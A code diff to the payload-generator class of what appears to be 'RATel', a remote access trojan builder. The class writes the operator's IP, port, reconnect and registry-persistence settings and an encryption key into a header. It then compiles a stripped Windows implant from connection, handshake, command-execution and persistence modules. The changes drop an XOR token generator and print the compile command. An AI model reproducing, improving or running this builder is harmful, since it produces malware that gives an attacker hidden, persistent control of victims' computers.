@@ -34,8 +34,6 @@ class GeneratePayload:
         self.name = name
         self.registry = registry
 
-        
-        self.token = self.generateToken(22) #The key to encrypt and decrypt data using the XOR algorithm
         self.key = other.generate_PBKDF2_key(password)
 
         other.printColor("successfully","KEY PBKDF2: \n{}".format(self.key))
@@ -68,13 +66,6 @@ class GeneratePayload:
         else:
             other.printColor("successfully", "[+] writing in common.h is done successfully. ")
 
-
-    def generateToken(self,size):
-        token = binascii.hexlify(os.urandom(size)).decode()
-        other.printColor("successfully", "[+] the tokken was generated")
-        other.printColor("successfully","[+] token: {}\n".format(token))
-        return token
-
     def compilate(self):
 
         current_path = os.getcwd()
@@ -84,6 +75,7 @@ class GeneratePayload:
             cmd = "i686-w64-mingw32-g++ main.cpp Exec.cpp other.cpp   HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
         elif(self.os == "Windows"):
             cmd = "g++ main.cpp Exec.cpp HandShake.cpp  Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -Os -s".format(current_path+"/payload/"+self.name)
+            print(cmd)
         else:
             other.printColor("error","[-] RATel is incompatible with: {}".format(self.os))
             other.printColor("error","[-] please try to restart the RATelgenerator on Windows or Linux.")
@@ -115,7 +107,7 @@ class GeneratePayload:
         other.printColor("information","[+] the current OS of the system: {}\n".format(self.os))
 
         #print(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token))
-        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.token, self.registry, self.key))
+        self.writeFile(other.customHeader(self.ip, self.auto, self.port, self.reco, self.name, self.registry, self.key))
         
         self.compilate() #compilate
         time.sleep(1) #tempo 
